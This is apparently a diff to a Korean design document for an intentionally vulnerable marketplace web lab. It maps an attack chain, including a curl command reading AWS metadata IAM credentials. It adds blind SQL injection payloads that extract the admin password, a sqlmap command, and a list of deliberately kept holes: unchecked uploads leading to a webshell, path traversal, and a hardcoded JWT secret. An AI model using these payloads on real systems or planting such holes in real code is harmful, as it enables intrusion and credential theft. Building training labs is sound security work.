@@ -38,6 +38,7 @@
 
 ### 5단계: 클라우드 피벗
 9. **IMDS 탈취** — WAS에서 AWS 메타데이터 서비스(`169.254.169.254`)에서 IAM 자격증명 탈취
+                   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 10. **프록시/터널링 구성** — 탈취한 정보 기반으로 터널링 도구를 사용해 RDS 접근 경로 확보
 
 ### 6단계: 목적 달성
@@ -97,11 +98,72 @@ dgjt_backend/
 - 엔드포인트: `db-ksj16.cfa620y6u0rh.ap-northeast-2.rds.amazonaws.com`
 - DB명: `secondhand_platform`
 
+## SQL Injection 취약점 상세
+
+### Blind SQLi 포인트
+
+#### 1. `/api/users/check-nickname?nickname=` — Boolean-based (최적)
+- **파일**: `routers/users.php:27`
+- **인증**: 불필요
+- **응답**: `{"available": true}` / `{"available": false}` — 참/거짓 직접 반영
+- **주입 예시**:
+  ```
+  ?nickname=' OR (SELECT SUBSTRING(user_pwd,1,1) FROM users WHERE user_id='admin')='a'-- -
+  → available: false  (조건 참 = 첫 글자가 'a')
+  → available: true   (조건 거짓)
+  ```
+- sqlmap: `sqlmap -u "http://HOST/api/users/check-nickname?nickname=test" --dbms=mysql --level=3`
+
+#### 2. `POST /api/auth/register` — Boolean-based (user_id 필드)
+- **파일**: `routers/auth.php:21`
+- **인증**: 불필요
+- **응답**: `409` (user_id 존재) / `201` (없음) — HTTP 상태코드로 참/거짓 구분
+- **주입 예시**:
+  ```json
+  {"user_id": "' UNION SELECT 1 FROM users WHERE user_pwd LIKE 'a%'-- -", ...}
+  → 409: 비밀번호 첫 글자가 'a'
+  → 201: 불일치
+  ```
+
+#### 3. `POST /api/auth/password/reset` — Boolean-based (user_id / email 필드)
+- **파일**: `routers/auth.php:124`
+- **인증**: 불필요
+- **응답**: `404` (조건 거짓) / `200` (조건 참)
+- 파라미터 두 개(`user_id`, `email`) 모두 주입 가능
+
+### Union-based / Error-based SQLi 포인트 (결과가 응답에 직접 반영)
+~~- `GET /api/products?search=` — `routers/product.php:59`~~
+~~- `GET /api/shares?search=` — `routers/share.php:32`~~
+~~- `GET /api/search?q=` — `routers/product.php:124` (products + users 동시 반환)~~
+> **수정 완료**: 위 3개 엔드포인트는 prepared statement로 패치됨 (아래 패치 현황 참고)
+
+### Prepared Statement 패치 현황
+
+Blind SQLi 포인트 3개를 제외하고 나머지 SQLi는 모두 prepared statement로 수정 완료.
+
+**패치된 파일**: `auth.php`, `users.php`, `product.php`, `share.php`
+**패치 제외 (의도적 유지)**: `banners.php`
+
+| 파일 | 패치된 포인트 |
+|------|--------------|
+| `auth.php` | 로그인 쿼리, admin 조회, refresh_token INSERT/SELECT, 비밀번호 UPDATE |
+| `users.php` | 프로필 수정 동적 UPDATE, DELETE, 유저 조회, 상품 목록 조회 |
+| `product.php` | 검색 LIKE, 상품 INSERT, 내 상품 SELECT, 통합검색, seller 조회, PATCH 동적 UPDATE, 이미지 INSERT, 댓글 INSERT, 상태 UPDATE |
+| `share.php` | product.php와 동일한 패턴 전체 |
+
+**패치 방식 참고사항**
+- LIKE 검색: `%?%` 대신 값에 `%` 포함 → `$params[] = "%{$search}%"` 후 `?` 바인딩
+- 동적 SET 절: 컬럼명은 `$allowed` 화이트리스트로 안전, 값만 `?` 바인딩
+- `parent_id` NULL: PDO가 PHP `null`을 SQL `NULL`로 자동 처리
+- int 캐스팅된 ID(`$pid`, `$sid`, `$cid` 등): 문자열 주입 위험 없으므로 `query()` 유지
+
+---
+
 ## 작업 현황
 
 ### 완료
 - 백엔드 PHP 라우터 골격 — `auth`, `users`, `product`, `banners`, `share`, `download`
-- 의도적 SQL Injection 취약점 — 모든 라우터 (PDO prepared statement 미사용, 문자열 결합)
+- 의도적 SQL Injection 취약점 — Blind SQLi 포인트 3개만 유지, 나머지는 prepared statement로 패치 완료
 - JWT 하드코딩 secret — `config.php`의 `jwt.secret` fallback 값
 - 배너 업로드 (admin) — 확장자 검증 없음, `uploads/banners/`에 저장 → 웹쉘 진입점
 - Path Traversal 다운로드 API — `routers/download.php` (`GET /api/download?file=...`)
